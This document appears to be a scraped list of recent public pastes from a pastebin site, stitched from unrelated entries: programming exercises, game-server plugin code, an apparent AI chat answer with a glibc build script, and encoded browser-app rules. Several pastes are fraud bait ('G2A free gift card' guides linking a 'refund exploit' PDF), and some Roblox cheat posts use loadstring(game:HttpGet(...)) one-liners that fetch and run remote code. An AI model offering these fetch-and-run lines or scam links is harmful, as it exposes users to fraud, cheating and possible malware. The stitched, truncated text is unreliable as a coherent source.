	md5_finish_ctx(&ctx, result);
	md5_hex(result, hash);
}

/**************************************************************************/

"
mtkE5zDu,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Thursday 16th of May 2024 06:19:04 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_598769.pdf

Working as of:
16 May 2024"
AB1qyegw,data-2,TestGuy1,JSON,Thursday 16th of May 2024 06:07:23 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'dfac735e718d5a57c0d82c7726c1928e645cd74fe139f13afdc9992ff0942840d792dd3276df4f5864e06fbe759ca3de88f286ac73f0d842442fbce9d30ba278c587e17ad7534ee679dac95d7f334736a07c726bc2de1c37f883f544cc686e11148b40095754c4e95620d1c854cf67e11fe82d734ecba214b62b7fa5ecfae644',
  otherdata: [
    '6f0a63de444ea443bda7ff826d6ee231',
    'cbf310361dbc57744febe4ce0a6e92f9',
    '44d3db58ed65fd26b030e403a8c0577c',
    '41a6c3cfb60209dd1038b1c0f63fe6bf',
    'b95757fbcad84392ab8ef2b5b35ef712',
    '21266e174d717b617d22ecb512e2fcf2',
    '6313d8f8442f9d770c509cfc5adc3399',
    '79cfd4e35e6c81ce3380798d92177cce'
  ]
}"
H0Pp3sNE,Pet Simulator 99 Script (Link),Bacon_Script,Lua,Thursday 16th of May 2024 05:43:49 AM CDT,"loadstring(game:HttpGet(""https://pastebin.com/raw/NsA1KyhC""))()"
NsA1KyhC,Pet Simulator 99 Script OP😈🔥,Bacon_Script,Lua,Thursday 16th of May 2024 05:42:09 AM CDT,loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/840fc22725f3f29d7e07ed24.lua'))()
1sxdcDt4,Pastebin.ai - #1 Free Pastebin alternative,xxsa,PHP,Thursday 16th of May 2024 05:13:22 AM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.x
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
..................
..............................
"
as1veSBc,Untitled,35657,C++,Thursday 16th of May 2024 05:12:01 AM CDT,"#include <iostream>
#include <set>

using namespace std;

class worker {

public:

    worker(string name, int salary, int id) : name_(name), salary_(salary), id_(id) {}

    void set_name(const string& name) {
        name_ = name;
    }

    string get_name() {
        return name_;
    }

    void set_salary(int salary) {
        salary_ = salary;
    }

    int get_salary() {
        return salary_;
    }

    void set_id(int id) {
        id_ = id;
    }

    int get_id() {
        return id_;
    }

    virtual void work() = 0;

private:
    string name_;
    int salary_;
    int id_;
};

class programmer : public worker {

public:
    programmer(string name, int salary, int id) : worker(name, salary, id) {}

    void add_project(string project_name) {
        projects_.insert(project_name);
    }

    void del_project(string project_name) {
        projects_.erase(project_name);
    }

    int get_project_number() {
        return projects_.size();
    }

    void work() override {
        cout << ""Я пишу код"" << endl;
    }

private:
    set<string> projects_;
};

class manager : public worker {

public:
    manager(string name, int salary, int id, string department_name, int employees_number) : worker(name, salary, id), department_name_(department_name), employees_number_(employees_number) {}

    int get_employees_number() {
        return employees_number_;
    }

    void set_department_name(string name) {
        department_name_ = name;
    }

    string get_department_name() {
        return department_name_;
    }

    void work() override {
        cout << ""Я руковожу"" << endl;
    }

private:
    string department_name_;
    int employees_number_;
};

int main() {
    setlocale(LC_ALL, ""ru"");

    programmer pr(""Иван"", 1000, 12356733);
    
    manager mn(""Оля"", 2000, 12356741, ""Отдел разработки"", 10);

    pr.add_project(""Калькулятор"");

    cout << pr.get_project_number() << endl;

    cout << mn.get_department_name() << endl;

    mn.work();

    pr.work();
}
"
7nWY0vvr,Entity,LA_,PHP,Thursday 16th of May 2024 04:48:52 AM CDT,"<?php
declare(strict_types=1);

namespace plugin\entity\type;

use pocketmine\entity\Entity;
use pocketmine\entity\EntitySizeInfo;
use pocketmine\nbt\tag\CompoundTag;
use pocketmine\entity\Location;
use pocketmine\player\Player;
use pocketmine\math\Vector3;
use pocketmine\event\entity\EntityDamageEvent;

// use pocketmine\entity\Human;


// https://github.com/CustomiesDevs/Customies/wiki/Custom-Entities
class DinosaurEntity extends Entity {

    public function __construct(Location $location) {
        $this->setNameTag(""Dino"");
        $this->setNameTagAlwaysVisible(true);

        parent::__construct($location);
    }

    // public function __construct(Location $location, ?CompoundTag $nbt = null) {
    //     parent::__construct($location, $nbt);
    //     $this->setNameTagVisible();
    //     $this->setNameTagAlwaysVisible();
    //     $this->setNameTag(""zzzz"");
    // }

    protected function getInitialSizeInfo() : EntitySizeInfo {
        return new EntitySizeInfo(2.0, 2.0, 2.0);
    }

    protected function getInitialDragMultiplier() : float {
        return 0;
    }

    protected function getInitialGravity() : float {
        return 0;
    }

    public static function getNetworkTypeId() : string {
        return ""alleva:dinosaur"";
    }

    // public function onInteract(Player $player, Vector3 $clickPos) : bool{
    //     $player->sendMessage(""Hello, my friend!"");
    //     return true;
    // }

    // public function onInteract(Player $player, Vector3 $clickPos) : bool {
    //     $player->sendMessage(""Hello, my friend!"");
    // }

    // public function attack(EntityDamageEvent $source): void {
    //     parent::attack($source);
    //     if ($source instanceof EntityDamageByEntityEvent) {
    //         $player = $source->getDamager();
    //         $player->sendMessage(""Hello"");
    //     }
    // }

    public function entityBaseTick(int $tickDiff = 1) : bool {
        return parent::entityBaseTick($tickDiff);
    }


    public function onUpdate(int $currentTick) : bool {
        // $this->server->getLogger()->info(""onUpdate DinosaurEntity"");
        if ($this->closed){
            return false;
        }
        $tickDiff = $currentTick - $this->lastUpdate;
        // $this->server->getLogger()->info((string)$tickDiff);
        // if($this->attackTime > 0) {
            $this->move($this->motion->x * $tickDiff, $this->motion->y, $this->motion->z * $tickDiff);
            $this->motion->y -= 0.2 * $tickDiff;
            $this->updateMovement();
        // }
        // return true;
        return parent::onUpdate($currentTick);
    }
}"
WKLky0cS,Listener,LA_,PHP,Thursday 16th of May 2024 04:47:50 AM CDT,"<?php
namespace plugin;

use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\entity\EntitySpawnEvent;
use pocketmine\event\entity\EntityDamageEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\Listener;
use pocketmine\network\mcpe\protocol\AnimateEntityPacket;
use pocketmine\Server;
use plugin\entity\type\DinosaurEntity;
use pocketmine\utils\TextFormat;
use pocketmine\network\mcpe\NetworkBroadcastUtils;
use pocketmine\console\ConsoleCommandSender;

class EventListener implements Listener {
    public Main $plugin;

    public function __construct(Main $plugin) {
        $this->plugin = $plugin;
    }


    public function doAnimation
      (
        string $animation,
        $entity,
        string $nextState = """",
        string $stopExpression = """",
        int    $stopExpressionVersion = 0,
        string $controller = """",
        float  $blendOutTime = 0
      ): void
      {
        foreach ($entity->getViewers() as $player) {
        //foreach ($entity->getWorld()->getViewersForPosition($entity->getPosition()) as $player) {
          // if($entity instanceof DinosaurEntity) {

              if (isset($player)) {
                if ($player->isConnected()) {
                  $player->getNetworkSession()->sendDataPacket(AnimateEntityPacket::create(
                    $animation, $nextState, $stopExpression, $stopExpressionVersion, $controller, $blendOutTime, [$entity->getId()]
                  ));
                }
              }
          // }
        }
      }


    // https://apidoc.pmmp.io/df/d6f/classpocketmine_1_1event_1_1entity_1_1_entity_spawn_event.html
    public function onEntitySpawn(EntitySpawnEvent $event): void {
        $entity = $event->getEntity();
        if($entity instanceof DinosaurEntity) {
            $this->plugin->getLogger()->info(TextFormat::DARK_GREEN . ""onEntitySpawn DinosaurEntity"");

            // https://apidoc.pmmp.io/dc/da7/classpocketmine_1_1network_1_1mcpe_1_1protocol_1_1_animate_entity_packet.html
            // $animation = AnimateEntityPacket::create(""animation.dinosaur.move"","""","""",0,"""",0,[$entity->getId()]);
            // NetworkBroadcastUtils::broadcastPackets($entity->getWorld()->getPlayers(), [$animation]);

            $this->doAnimation(""animation.dinosaur.move"", $entity);
        }
    }


    // public function onInteract(PlayerInteractEvent $event): void{
    //     // $entity = $event->getEntity();
    //     $player = $event->getPlayer();
    //     $this->plugin->getLogger()->info(TextFormat::DARK_GREEN . ""onInteract"");
    //     $player->sendMessage(""test"");
    // }

    public function onEntityDamageByEntityEvent(EntityDamageByEntityEvent $event){
        $attacker = $event->getDamager();
        $victim = $event->getEntity();
        if($victim instanceof DinosaurEntity) {
            // $this->plugin->getLogger()->info(TextFormat::DARK_GREEN . ""onEntityDamageByEntityEvent DinosaurEntity"");
            $attacker->sendMessage(""Hello"");
        }
    }



}"
wHN90QSH,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Thursday 16th of May 2024 04:39:18 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
16 May 2024"
qvAyrX9M,Pet Simulator 99 VERY OP SCRIPT😈🔥,Bacon_Script,Lua,Thursday 16th of May 2024 04:37:58 AM CDT,"loadstring(game:HttpGet('https://pastebin.com/raw/DXBHHcQW'))()


Copy and paste this to your executor🔥😈"
1izsMdfP,邀您一起看：24.4416932,xiaomianao666,JavaScript,Thursday 16th of May 2024 04:19:42 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥24.4416932@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuino+aekFwiLFwicGF0aFwiOlwibGF6eVwiLFwicnVsZVwiOlwidmFyIGxhenkgPSAkKCcnKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgICAgICB2YXIgaHRtbCA9IHBkZmgocmVxdWVzdChpbnB1dCwge30pLCAnI21hZ25ldE9wZW4mJmEmJmhyZWYnKTtcXG4gICAgICAgIGlmIChodG1sKSB7XFxuICAgICAgICAgICAgcmV0dXJuIGh0bWw7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/mtJfmtJfnnaHlkKcnO1xcbiAgICAgICAgfSAgXFxufSk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLmkJzntKJcIixcInBhdGhcIjpcInNvXCIsXCJydWxlXCI6XCJqczpcXG52YXIgZCA9IFtdO1xcbnZhciBodG1sID0gZ2V0UmVzQ29kZSgpO1xcbi8qXFxuaWYgKE1ZX1BBR0UgPT0gMSkge1xcbmQucHVzaCh7XFxuICAgIGltZzogJ2h0dHBzOi8vd3d3LmhsYXBpLmNuL2FwaS9tbTEnICsgJyMnICsgbmV3IERhdGUoKS5nZXRUaW1lKCksXFxuICAgIHVybDogTVlfVVJMLFxcbiAgICBkZXNjOicwJyxcXG4gICAgY29sX3R5cGU6IFxcXCJjYXJkX3BpY18xXFxcIlxcbn0pXFxufTsqL1xcblxcbmV2YWwoSlNPTi5wYXJzZShmZXRjaCgnaGlrZXI6Ly9wYWdlL2xhenknLCB7fSkpLnJ1bGUpO1xcblxcbnZhciBsaXN0ID0gcGRmYShodG1sLCAnYm9keSYmLmRhdGEtbGlzdCYmLnJvdywxOicpO1xcbmZvciAodmFyIGogaW4gbGlzdCkge1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgLy90aXRsZTogcGRmaChsaXN0W2pdLCAnYSYmdGl0bGUnKSxcXG4gICAgICAgIHRpdGxlOiAn4oCY4oCY4oCZ4oCZPGI+PHNtYWxsPjxmb250IGNvbG9yPVxcXCIjNDY4MkI0XFxcIj4gJyArIHBkZmgobGlzdFtqXSwgJ2EmJnRpdGxlJykgKyAnPC9mb250Pjwvc21hbGw+JyxcXG4gICAgICAgIGRlc2M6IHBkZmgobGlzdFtqXSwgJy5zaXplLWRhdGUmJlRleHQnKSxcXG4gICAgICAgIC8vaW1nOiBwZChsaXN0W2pdLCAnaW1nJiZzcmMnKSsnQFJlZmVyZXI9JyxcXG4gICAgICAgIC8vY29udGVudDpwZGZoKGxpc3Rbal0sICdwOm1hdGNoZXMoSUTvvJopJiZUZXh0JyksXFxuICAgICAgICB1cmw6IHBkKGxpc3Rbal0sICdhJiZocmVmJykgKyBsYXp5LFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxuICAgIH0pO1xcbn1cXG5cXG5zZXRSZXN1bHQoZClcIn1dLFwic2F2ZWRcIjpmYWxzZSxcInRpdGxlXCI6XCJCVFNPV1wiLFwidmVyc2lvblwiOjAsXCJ1cmxcIjpcImh0dHBzOi8vYnRzb3cubW90b3JjeWNsZXMvc2VhcmNoLzQ0MTY5MzI7Z2V0O1VURi04O3tVc2VyLUFnZW50QE1vemlsbGEvNS4wIChMaW51eO+8m++8myBBbmRyb2lkIDEx77yb77ybIE1pIDEwIFBybykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg4LjAuNDMyNC4xNTIgTW9iaWxlIFNhZmFyaS81MzcuMzZ9XCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczooXFxuKCkgPT4ge1xcbiAgICBldmFsKEpTT04ucGFyc2UoZmV0Y2goXFxcImhpa2VyOi8vcGFnZS9zb1xcXCIsIHt9KSkucnVsZSk7XFxufVxcbikoKVwiLFwiZ3JvdXBcIjpcIuKRo+KPsFwiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiLy8gICAgaHR0cHM6Ly9idHNvdy5jb20vXCIsXCJwYWdlc1wiOlwiW3tcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuino+aekFxcXCIsXFxcInBhdGhcXFwiOlxcXCJsYXp5XFxcIixcXFwicnVsZVxcXCI6XFxcInZhciBsYXp5ID0gJCgnJykubGF6eVJ1bGUoKCkgPT4ge1xcXFxuICAgICAgICB2YXIgaHRtbCA9IHBkZmgocmVxdWVzdChpbnB1dCwge30pLCAnI21hZ25ldE9wZW4mJmEmJmhyZWYnKTtcXFxcbiAgICAgICAgaWYgKGh0bWwpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBodG1sO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+a0l+a0l+edoeWQpyc7XFxcXG4gICAgICAgIH0gIFxcXFxufSk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5pCc57SiXFxcIixcXFwicGF0aFxcXCI6XFxcInNvXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGQgPSBbXTtcXFxcbnZhciBodG1sID0gZ2V0UmVzQ29kZSgpO1xcXFxuLypcXFxcbmlmIChNWV9QQUdFID09IDEpIHtcXFxcbmQucHVzaCh7XFxcXG4gICAgaW1nOiAnaHR0cHM6Ly93d3cuaGxhcGkuY24vYXBpL21tMScgKyAnIycgKyBuZXcgRGF0ZSgpLmdldFRpbWUoKSxcXFxcbiAgICB1cmw6IE1ZX1VSTCxcXFxcbiAgICBkZXNjOicwJyxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJjYXJkX3BpY18xXFxcXFxcXCJcXFxcbn0pXFxcXG59OyovXFxcXG5cXFxcbmV2YWwoSlNPTi5wYXJzZShmZXRjaCgnaGlrZXI6Ly9wYWdlL2xhenknLCB7fSkpLnJ1bGUpO1xcXFxuXFxcXG52YXIgbGlzdCA9IHBkZmEoaHRtbCwgJ2JvZHkmJi5kYXRhLWxpc3QmJi5yb3csMTonKTtcXFxcbmZvciAodmFyIGogaW4gbGlzdCkge1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIC8vdGl0bGU6IHBkZmgobGlzdFtqXSwgJ2EmJnRpdGxlJyksXFxcXG4gICAgICAgIHRpdGxlOiAn4oCY4oCY4oCZ4oCZPGI+PHNtYWxsPjxmb250IGNvbG9yPVxcXFxcXFwiIzQ2ODJCNFxcXFxcXFwiPiAnICsgcGRmaChsaXN0W2pdLCAnYSYmdGl0bGUnKSArICc8L2ZvbnQ+PC9zbWFsbD4nLFxcXFxuICAgICAgICBkZXNjOiBwZGZoKGxpc3Rbal0sICcuc2l6ZS1kYXRlJiZUZXh0JyksXFxcXG4gICAgICAgIC8vaW1nOiBwZChsaXN0W2pdLCAnaW1nJiZzcmMnKSsnQFJlZmVyZXI9JyxcXFxcbiAgICAgICAgLy9jb250ZW50OnBkZmgobGlzdFtqXSwgJ3A6bWF0Y2hlcyhJRO+8mikmJlRleHQnKSxcXFxcbiAgICAgICAgdXJsOiBwZChsaXN0W2pdLCAnYSYmaHJlZicpICsgbGF6eSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbn1cXFxcblxcXFxuc2V0UmVzdWx0KGQpXFxcIn1dXCJ9IiwidGl0bGUiOiIyNC40NDE2OTMyIn0=
vCbrSw8w,Практика (день 4),Lavig,Python,Thursday 16th of May 2024 04:15:34 AM CDT,"def skip():
    print (""_"" * 60)
    print (""_"" * 60)
skip()
# Варіант 2
# Завдання 1
while True:
    try:
        number = float((input(""\033[1m\033[33mВведіть будь-яке натуральне п'ятизначне число: \033[0m"")))
    except:
        print(""\033[1m\033[31mВводити можна тільки числа. Спробуйте ще раз!\033[0m"")
        continue
    if number < 0:
        print(""\033[1m\033[31mВводити можна тільки натуральні числа. Спробуйте ще раз!\033[0m"")
        continue
    if number.is_integer() == True:
        number = int(number)
    else:
        print(""\033[1m\033[31mВводити можна тільки натуральні числа. Спробуйте ще раз!\033[0m"")
        continue
    number = str(number)
    length = len(number)
    if length != 5:
        print(""\033[1m\033[31mВводити можна тільки п'ятизначні числа. Спробуйте ще раз!\033[0m"")
        continue
    break
number = int(number)
print(""\033[1m\033[95mПерша цифра числа –\033[97m"", number // 10000, ""\033[0m"")
print(""\033[92;1mДруга цифра числа –\033[97m"", number % 10000 // 1000, ""\033[0m"")
print(""\033[1m\033[96mТретя цифра числа –\033[97m"", number % 1000 // 100, ""\033[0m"")
print(""\033[1m\033[33mЧетверта цифра числа –\033[97m"", number % 100 // 10, ""\033[0m"")
print(""\033[1m\033[95mП'ята цифра числа –\033[97m"", number % 10 // 1, ""\033[0m"")
skip()
# Завдання 2
sentence = input(""\033[92;1mВведіть будь-яке речення: \033[0m"")
print(""\033[1m\033[96mКількість симолів у реченні –\033[97m"", len(sentence), ""\033[0m"")
skip()"
dVZ2aXj7,Download -compile different glibc,plirof2,Bash,Thursday 16th of May 2024 04:06:09 AM CDT,"I have debian bulleye. Can you write me a bash script that will download and compile different glibc versions and put them on different folders? I want to be able to runn programs made for different versions using patchelf --set-interpreter . I don't want to change anything on my system. I just want to have different versions of glibc in different folders. Please, selecte the most important versions that will cover most of old and new programs.

---------
Sure! Here's a bash script that will download and compile glibc versions 2.13, 2.17, 2.23, 2.27, 2.31, and 2.33, and place them in different folders:
```bash
#!/bin/bash

# Create directories for each glibc version
mkdir glibc-2.13 glibc-2.17 glibc-2.23 glibc-2.27 glibc-2.31 glibc-2.33

# Download and extract glibc versions
wget https://ftp.gnu.org/gnu/glibc/glibc-2.13.tar.gz
tar -xzvf glibc-2.13.tar.gz -C glibc-2.13 --strip-components=1

wget https://ftp.gnu.org/gnu/glibc/glibc-2.17.tar.gz
tar -xzvf glibc-2.17.tar.gz -C glibc-2.17 --strip-components=1

wget https://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz
tar -xzvf glibc-2.23.tar.gz -C glibc-2.23 --strip-components=1

wget https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.gz
tar -xzvf glibc-2.27.tar.gz -C glibc-2.27 --strip-components=1

wget https://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz
tar -xzvf glibc-2.31.tar.gz -C glibc-2.31 --strip-components=1

wget https://ftp.gnu.org/gnu/glibc/glibc-2.33.tar.gz
tar -xzvf glibc-2.33.tar.gz -C glibc-2.33 --strip-components=1

# Compile each glibc version
for dir in glibc-2.13 glibc-2.17 glibc-2.23 glibc-2.27 glibc-2.31 glibc-2.33; do
    (
        cd $dir
        mkdir build
        cd build
        ../configure --prefix=$PWD/install
        make -j$(nproc)
        make install
    )
done

```bash
This script will download the specified glibc versions, extract them, compile them, and install them in separate directories. You can then use patchelf to set the interpreter path when running programs with different glibc versions.

Remember to give execute permission to the script using chmod +x script.sh and run it using ./script.sh from the terminal



"
nwALES2C,邀您一起看：尖叫,xiaomianao666,JavaScript,Thursday 16th of May 2024 04:05:45 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥尖叫@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuWKqOaAgVwiLFwicGF0aFwiOlwiZHRcIixcInJ1bGVcIjpcIlxcblxcbmNvbnN0IGVtcHR5ID0gXFxcImhpa2VyOi8vZW1wdHlcXFwiXFxuXFxudHJ5IHtcXG4gICAgdmFyIGNhdGVnb3JpZXMgPSBwZGZhKGh0bWwsIOWkp+exu+WumuS9jSkuY29uY2F0KHBkZmEoaHRtbCwg5ou85o6l5YiG57G7KSlcXG59IGNhdGNoIChlKSB7XFxuICAgIHZhciBjYXRlZ29yaWVzID0gcGRmYShodG1sLCDlpKfnsbvlrprkvY0pXFxufVxcblxcbmxldCBpbml0X2NhdGUgPSBbXVxcblxcbmZvciAobGV0IGkgPSAwOyBpIDwgMjA7IGkrKykge1xcbiAgICBpbml0X2NhdGUucHVzaChcXFwiMFxcXCIpXFxufVxcblxcbmNvbnN0IGZvbGQgPSBnZXRWYXIoTVlfUlVMRS5ncm91cCwgXFxcIjBcXFwiKVxcbmNvbnN0IGNhdGVfdGVtcF9qc29uID0gZ2V0VmFyKE1ZX1JVTEUudGl0bGUsIEpTT04uc3RyaW5naWZ5KGluaXRfY2F0ZSkpXFxuY29uc3QgY2F0ZV90ZW1wID0gSlNPTi5wYXJzZShjYXRlX3RlbXBfanNvbilcXG5cXG5pZiAocGFyc2VJbnQocGFnZSkgPT09IDEpIHtcXG5cXG5cXG5cXG5jYXRlZ29yaWVzLmZvckVhY2goKGNhdGVnb3J5LCBpbmRleCkgPT4ge1xcbiAgICAgICAgbGV0IHN1Yl9jYXRlZ29yaWVzID0gcGRmYShjYXRlZ29yeSwg5bCP57G75a6a5L2NKTsgICBcXG4gICAgICAgICAgICBzdWJfY2F0ZWdvcmllcy5mb3JFYWNoKChpdGVtLCBrZXkpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IHRpdGxlID0gcGRmaChpdGVtLCDliIbnsbvmoIfpopgpXFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZToga2V5LnRvU3RyaW5nKCkgPT09IGNhdGVfdGVtcFtpbmRleF0gPyAn4oCc4oCc4oCd4oCdPGI+PHNwYW4gc3R5bGU9XFxcImNvbG9yOiAnICsg5YiG57G76aKc6ImyICsgJ1xcXCI+JyArIHRpdGxlICsgJzwvc3Bhbj48L2I+JyA6IHRpdGxlLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiAkKHBkKGl0ZW0sIOWIhuexu+mTvuaOpSkgKyAnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgocGFyYW1zKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zLmNhdGVfdGVtcFtwYXJhbXMuaW5kZXhdID0gcGFyYW1zLmtleS50b1N0cmluZygpXFxuXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0VmFyKE1ZX1JVTEUudGl0bGUsIEpTT04uc3RyaW5naWZ5KHBhcmFtcy5jYXRlX3RlbXApKVxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihNWV9SVUxFLnVybCwgaW5wdXQpXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSlcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9LCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY2F0ZV90ZW1wOiBjYXRlX3RlbXAsXFxuICAgICAgICAgICAgICAgICAgICAgICAgaW5kZXg6IGluZGV4LFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGtleToga2V5LFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhZ2U6IHBhZ2UsXFxuICAgICAgICAgICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJibGFua19ibG9ja1xcXCJcXG4gICAgICAgICAgICB9KTtcXG4gICAgfSlcXG59XFxuXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLkuIDnuqdcIixcInBhdGhcIjpcInlpamlcIixcInJ1bGVcIjpcImpzOlxcbnZhciBkID0gW107XFxuXFxuY29uc3Qg5YiG57G76aKc6ImyID0gJyNmZjY4NzcnXFxuY29uc3Qg5aSn57G75a6a5L2NID0gJyNsZW8tc2VsZWN0LTImJnVsJ1xcbmNvbnN0IOaLvOaOpeWIhuexuyA9ICcnXFxuY29uc3Qg5bCP57G75a6a5L2NID0gJ2JvZHkmJmE6bm90KDptYXRjaGVzKOmmlumhtXzkupLmjaJ85YiG57G7fOW5s+WPsCkpJ1xcbmNvbnN0IOWIhuexu+agh+mimCA9ICdhJiZUZXh0J1xcbmNvbnN0IOWIhuexu+mTvuaOpSA9ICdhJiZocmVmJ1xcbk1ZX1VSTCA9IE1ZX1VSTC5yZXBsYWNlKCdoaWtlcjovL2VtcHR5IyMnLCAnJylcXG5cXG5sZXQgdHJ1ZV91cmwgPSBnZXRWYXIoTVlfUlVMRS51cmwsIE1ZX1VSTClcXG5jb25zdCBwYWdlID0gTVlfUEFHRVxcblxcbmlmIChnZXRWYXIoTVlfUlVMRS51cmwpKSB7XFxuICAgIGlmICgvXFxcXD9wPS8udGVzdCh0cnVlX3VybCkpe1xcbnRydWVfdXJsPXRydWVfdXJsLnJlcGxhY2UoXFxcIlxcXFw/cD1cXFwiLFxcXCJcXFxcP3M9JnA9XFxcIikrJyZmPTEmdj0mc29ydD1uZXcmcGFnZT0nICsgcGFnZVxcbiAgICB9ZWxzZXtcXG50cnVlX3VybD10cnVlX3VybCsnJnBhZ2U9JyArcGFnZVxcbiAgICB9XFxufVxcblxcbnZhciBodG1sID0gcmVxdWVzdCh0cnVlX3VybClcXG5ldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL2R0JykpLnJ1bGUpXFxuLy9ldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL2xhenknKSkucnVsZSlcXG5cXG52YXIgbGlzdCA9IHBkZmEoaHRtbCwgJ2JvZHkmJi5sZW8tdmlkZW8taXRlbXx8Lmxlby12aWRlby1yaXRlbScpO1xcbmZvciAodmFyIGogaW4gbGlzdCkge1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6IHBkZmgobGlzdFtqXSwgJ2EmJnRpdGxlJyksXFxuICAgICAgICBkZXNjOiBwZGZoKGh0bWwsICcubGVvLXZpZGVvLX